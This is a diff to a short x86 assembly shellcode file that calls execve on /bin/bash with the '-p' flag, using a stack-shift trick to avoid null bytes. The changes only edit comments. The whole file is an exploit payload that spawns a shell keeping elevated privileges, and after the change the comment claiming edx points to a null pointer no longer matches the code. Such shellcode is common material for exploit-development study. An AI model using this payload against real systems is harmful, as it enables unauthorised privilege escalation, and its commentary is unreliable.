@@ -1,7 +1,7 @@
 global _start
 
 section .text
-; execve("/bin/bash", ["/bin/bash", 0x0], [0x0]);
+; execve("/bin/bash", ["/bin/bash", "-p", 0x0], [0x0]);
 _start:
     xor eax, eax       ; set eax to 0x0
 
@@ -12,7 +12,7 @@ _start:
     mov ebx, esp       ;ebx points to "/bin/bash"
 
     ; write "-p" to the stack
-    push 0xffff702d    ;push "-p00"
+    push 0xffff702d    ;push "-p00" (shift out high bytes)
     shl dword [esp], 0x10
     shr dword [esp], 0x10
     mov ecx, esp       ;ecx points to "-p"
@@ -20,7 +20,7 @@ _start:
     push eax           ;push null pointer
     push ecx           ;push address of "-p"
     push ebx           ;push address of "/bin/bash"
-    mov ecx, esp       ;ecx points to ["bin/bash", 0x0]
+    mov ecx, esp       ;ecx points to ["bin/bash", "-p", 0x0]
 
     lea edx, [ecx+0x4] ;edx points to a null pointer
 
